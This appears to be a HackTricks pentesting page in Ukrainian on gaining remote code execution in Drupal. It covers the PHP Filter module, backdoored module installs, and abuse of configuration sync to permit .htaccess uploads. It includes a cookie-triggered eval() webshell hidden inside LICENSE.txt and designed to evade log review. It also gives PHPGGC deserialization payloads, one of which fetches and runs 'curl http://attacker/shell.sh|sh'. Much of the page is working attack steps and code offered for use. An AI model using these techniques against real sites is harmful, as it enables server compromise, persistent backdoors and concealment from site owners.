# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## With PHP Filter Module

> [!WARNING]
> У старіших версіях Drupal **(до версії 8)** можна було увійти як адміністратор і **увімкнути модуль `PHP filter`**, який «дозволяє виконувати вбудований PHP-код/фрагменти коду». Однак починаючи з версії 8 цей модуль за замовчуванням не встановлюється.

1. Перейдіть до **/modules/php** — якщо повертається помилка 403, то **PHP filter plugin встановлено і ви можете продовжити**
1. Якщо ні, перейдіть у `Modules`, поставте галочку біля `PHP Filter`, а потім натисніть `Save configuration`
2. Потім, щоб експлуатувати вразливість, натисніть `Add content`, виберіть `Basic Page` або `Article` і вкажіть **PHP backdoor**, потім у Text format оберіть `PHP` code і нарешті натисніть `Preview`
3. Щоб його активувати, просто перейдіть до щойно створеного node:
```bash
curl http://drupal.local/node/3
```
## Встановлення модуля PHP Filter

> [!WARNING]
> У поточних версіях неможливо встановити плагіни, маючи лише веб‑доступ після стандартної інсталяції.

Починаючи з версії **8**, [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **не встановлюється за замовчуванням**. Щоб скористатися цією функціональністю, нам доведеться **встановити модуль самостійно**.

1. Завантажте останню версію модуля з сайту Drupal.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Після завантаження перейдіть до **`Administration`** > **`Reports`** > **`Available updates`**.
3. Натисніть **`Browse`**, виберіть файл з каталогу, куди ми його завантажили, а потім натисніть **`Install`**.
4. Після встановлення модуля можна перейти до **`Content`** і **створити нову базову сторінку**, аналогічно прикладу для Drupal 7. Знову переконайтеся, що обрали **`PHP code` з випадаючого списку `Text format`**.

## Модуль із бекдором

> [!WARNING]
> У поточних версіях неможливо встановити плагіни, маючи лише веб‑доступ після стандартної інсталяції.

Було можливе **download** a **module**, додати до нього **backdoor** і **install** його. Наприклад, завантаживши [**Trurnstile**](https://www.drupal.org/project/turnstile) module у стиснутому форматі, створити всередині нього новий PHP backdoor файл, дозволити доступ до PHP файлу за допомогою `.htaccess`:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
А потім перейти на **`http://drupal.local/admin/modules/install`**, щоб встановити backdoored module і звернутися до **`/modules/turnstile/back.php`** для його виконання.

## Встановлення бекдору в Drupal за допомогою Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Пост від** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Частина 1 (активація _Media_ і _Media Library_)

У меню _Extend_ (/admin/modules) можна активувати плагіни, які здаються вже встановленими. За замовчуванням плагіни _Media_ та _Media Library_ не активовані, тому активуємо їх.

Перед активацією:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Після активації:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Частина 2 (використання функції _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Ми скористаємося функцією _Configuration synchronization_, щоб експортувати (export) та імпортувати (import) записи конфігурації Drupal:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

Почнемо з патчу першого параметра `allow_insecure_uploads` з:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

До:

Файл: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Застосуйте патч до field.field.media.document.field_media_document.yml**

Потім змініть другий запис `file_extensions` з:

Файл: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

До:

Файл: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Я не використовую це в цьому дописі, але зауважено, що можливе довільне визначення запису `file_directory` і що він вразливий до path traversal attack (тому ми можемо піднятися вгору по дереву файлової системи Drupal).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Частина 3 (використання функції _Add Document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Останній крок — найпростіший і розбито на два підкроки. Перший — завантажити файл у форматі .htaccess, щоб використати директиви Apache і дозволити інтерпретувати .txt файли двигуном PHP. Другий — завантажити .txt файл, що містить наш payload.

Файл: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Чому цей трюк крутий?

Тому що як тільки Webshell (який ми назвемо LICENSE.txt) буде розміщено на веб-сервері, ми зможемо передавати наші команди через `$_COOKIE`, і в логах веб-сервера це відобразиться як легітимний GET request до текстового файлу.

Навіщо називати наш Webshell LICENSE.txt?

Просто тому, що якщо взяти наступний файл, наприклад [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (який вже присутній у Drupal core), це файл із 339 рядків та розміром 17.6 KB, який ідеально підходить для додавання невеликого фрагмента PHP-коду посередині (оскільки файл достатньо великий).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Файл: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Частина 3.1 (завантаження файлу .htaccess)**

Спочатку ми використовуємо функцію _Add Document_ (/media/add/document), щоб завантажити наш файл, що містить директиви Apache (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Частина 3.2 (завантаження файлу LICENSE.txt)**

Потім ми знову використовуємо функцію _Add Document_ (/media/add/document), щоб завантажити Webshell, прихований у файлі ліцензії.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Частина 4 (взаємодія з Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Остання частина полягає у взаємодії з Webshell.

Як показано на наступному знімку екрана, якщо cookie, очікуваний нашим Webshell, не встановлено, при перегляді файлу через веб-браузер ми отримуємо такий результат.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Коли атакуючий встановлює cookie, він може взаємодіяти з Webshell і виконувати будь-які команди.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

І, як видно з логів, здається, був запитаний лише txt-файл.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Дякую, що знайшли час прочитати цю статтю. Сподіваюся, вона допоможе вам отримати кілька shells.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Два бюлетені, опубліковані **20 Nov 2024** (CVE-2024-55637 & CVE-2024-55638), описують нові **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). Вони **не піддаються прямій експлуатації**, але дають нападникам готовий ланцюжок після того, як будь-який contrib/module виконає `unserialize()` на вхідних даних користувача.

Практичний робочий процес експлуатації:

1. **Find the unserialize sink** (contrib module or custom code). Grep codebase for `unserialize(` or `Drupal\Component\Serialization\PhpSerialize::decode`. Target endpoints that accept POST/JSON or configuration imports.
2. **Generate a payload** using the vulnerable class path that matches the gadget chain. After SA-CORE-2024-008, the public chain was added to common payload generators. Example with PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **Надішліть serialized blob** до sink (e.g., parameter that gets deserialized). Для form-encoded body:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Trigger destruction** (часто автоматично наприкінці запиту) і виконати команду.

Примітки для тестування:

- Gadget працює лише на версіях **prior to 10.2.11 / 10.3.9 / 7.102** (patched). Перевірте версію цілі через `/core/lib/Drupal.php` або `CHANGELOG.txt`.
- Сторонні DB drivers можуть потребувати додаткового hardening; шукайте розгортання, які пропустили вікно оновлень безпеки.

## Останні contrib-module unsafe deserialization → RCE

Кілька contrib-модулів виправили небезпечні шляхи `unserialize()` наприкінці 2024 року. Якщо сайт не має цих оновлень, вони дають вам експлуатований sink, потрібний для core gadget chain:

- **Mailjet** (<4.0.1, CVE-2024-13296): дані, контрольовані адміністратором, передаються в `unserialize()`, що дозволяє **PHP Object Injection → RCE** при сполученні з core gadgets.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): подібне небезпечне використання `unserialize()`, доступне користувачам з правом `access administration pages`.

Ідея тестування (для авторизованих користувачів):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
Якщо модуль десеріалізує завантажені дані, gadget chain призводить до RCE. Поєднайте з XSS/CSRF, щоб вкрасти admin cookies та отримати повний ланцюжок атаки.

## Посилання

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
